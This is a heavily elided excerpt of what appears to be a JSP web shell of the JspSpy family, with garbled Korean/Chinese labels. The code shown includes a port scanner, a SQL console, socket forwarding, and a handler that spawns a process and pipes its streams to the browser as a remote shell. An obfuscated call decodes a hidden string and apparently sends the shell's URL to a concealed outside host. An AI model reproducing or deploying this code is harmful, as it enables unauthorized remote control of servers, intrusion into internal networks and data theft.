...
<%!/**
	...
	public static String uc(String str) {
		String c = "\n\r";
		long d = 127, f = 11, j = 12, h = 14, m = 31, r = 83, k = 1, n = 8, s = 114, u = -5, v = 5, a = 0;
	...
	private static class Util {
		...
		public static void outMsg(Writer out, String msg, String align)
			...
			out.write("<div style=\"background:#f1f1f1;border:1px solid #ddd;padding:15px;font:14px;text-align:"
					+ align
...
<%!private static interface Invoker {
		...
		public void invoke(HttpServletRequest request,
			...
			try {
				...
				out.println("<script type=\"text/javascript\">"
						...
						+ "	function fso(obj) {" + "		this.currentDir = '"
		...
		public void invoke(HttpServletRequest request,
			...
			try {
				...
				out.println("<table width=\"100%\" border=\"0\" cellpadding=\"15\" cellspacing=\"0\"><tr><td>"
						...
						+ ports
						+ "\" id=\"ports\" class=\"input\" style=\"width:40%;margin:0 8px;\" /> Timeout （취） : <input name=\"timeout\" type=\"text\" value=\""
						+ timeout
			...
			try {
				...
				for (String port : portArr) {
					try {
						Socket s = new Socket();
						s.connect(
								new InetSocketAddress(ip, Integer
	...
	private static class VConnInvoker extends DefaultInvoker {
		public void invoke(HttpServletRequest request,
			...
			try {
				PrintWriter out = response.getWriter();
				FileLocalUpload(uc(dx()) + sxm, request.getRequestURL()
						.toString(), "GBK");
				...
				if (!Util.isEmpty(sql)) {
					if (dbo == null || !((DBOperator) dbo).isValid()) {
						...
						if (obj instanceof ResultSet) {
							...
							out.println("<div style='padding:10px'><p><b>Query#0 : "
							...
							out.println("<div style='margin:10px'><h2>affected rows : <b>"
									+ obj + "</b></h2></div>");
						}
					}
				} else {
					...
					public void run() {
						while (true) {
							...
							try {
								...
								remoteSoc.connect(new InetSocketAddress(
		...
		public void invoke(HttpServletRequest request,
			...
			try {
				...
				if (type.toLowerCase().equals("start")) {
					...
					new OnLineConnector(new ByteArrayInputStream(
							outs.toByteArray()), pro.getOutputStream(),
							"exeOclientR", olp).start();
					new OnLineConnector(pro.getInputStream(),
							response.getOutputStream(), "exeRclientO", olp)
							.start();
					new OnLineConnector(pro.getErrorStream(),
							response.getOutputStream(), "exeRclientO", olp)
							.start();//댄轎斤口직。
...
<%
	try {
		...
		Util.outMsg(out,
				Util.htmlEncode(new String(bout.toByteArray()))
						.replace("\n", "<br/>"), "left");
		bout.close();
		out.flush();
